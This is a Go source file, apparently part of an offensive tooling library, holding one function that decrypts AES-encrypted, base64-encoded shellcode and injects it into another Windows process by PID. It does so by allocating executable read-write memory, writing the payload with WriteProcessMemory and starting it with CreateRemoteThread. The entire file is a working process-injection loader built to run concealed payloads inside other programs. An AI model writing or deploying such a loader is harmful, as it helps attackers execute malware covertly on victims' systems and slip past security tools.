package remoteThread

import (
	"crypto/aes"
	"crypto/cipher"
	"encoding/base64"
	"errors"
	"syscall"
	"unsafe"
)

const (
	MEM_COMMIT                = 0x1000
	MEM_RESERVE               = 0x2000
	PAGE_EXECUTE_READWRITE    = 0x40
	PROCESS_CREATE_THREAD     = 0x0002
	PROCESS_QUERY_INFORMATION = 0x0400
	PROCESS_VM_OPERATION      = 0x0008
	PROCESS_VM_WRITE          = 0x0020
	PROCESS_VM_READ           = 0x0010
)

var (
	kernel32           = syscall.MustLoadDLL("kernel32.dll")
	VirtualAlloc       = kernel32.MustFindProc("VirtualAlloc")
	VirtualAllocEx     = kernel32.MustFindProc("VirtualAllocEx")
	WriteProcessMemory = kernel32.MustFindProc("WriteProcessMemory")
	OpenProcess        = kernel32.MustFindProc("OpenProcess")
	CreateRemoteThread = kernel32.MustFindProc("CreateRemoteThread")
)

// ShellCodeCreateRemoteThread spawns shellcode in a remote process
func ShellCodeCreateRemoteThread(PID int, Shellcode string, password string) error {

	ciphertext, _ := base64.StdEncoding.DecodeString(Shellcode)
	key, _ := base64.StdEncoding.DecodeString(password)
	block, _ := aes.NewCipher(key)
	plaintext := make([]byte, len(ciphertext))
	stream := cipher.NewCTR(block, key[aes.BlockSize:])
	stream.XORKeyStream(plaintext, ciphertext)

	L_Addr, _, _ := VirtualAlloc.Call(0, uintptr(len(plaintext)), MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE)
	L_AddrPtr := (*[6300000]byte)(unsafe.Pointer(L_Addr))
	for i := 0; i < len(plaintext); i++ {
		L_AddrPtr[i] = plaintext[i]
	}

	var F int = 0
	Proc, _, _ := OpenProcess.Call(PROCESS_CREATE_THREAD|PROCESS_QUERY_INFORMATION|PROCESS_VM_OPERATION|PROCESS_VM_WRITE|PROCESS_VM_READ, uintptr(F), uintptr(PID))
	if Proc == 0 {
		err := errors.New("[!] ERROR: unable to open remote process")
		return err
	}
	R_Addr, _, _ := VirtualAllocEx.Call(Proc, uintptr(F), uintptr(len(plaintext)), MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE)
	if R_Addr == 0 {
		err := errors.New("[!] ERROR: unable to allocate memory in remote process")
		return err
	}
	WPMS, _, _ := WriteProcessMemory.Call(Proc, R_Addr, L_Addr, uintptr(len(plaintext)), uintptr(F))
	if WPMS == 0 {
		err := errors.New("[!] ERROR: unable to write shellcode to remote process")
		return err
	}

	CRTS, _, _ := CreateRemoteThread.Call(Proc, uintptr(F), 0, R_Addr, uintptr(F), 0, uintptr(F))
	if CRTS == 0 {
		err := errors.New("[!] ERROR: Can't Create Remote Thread.")
		return err
	}

	return nil
}
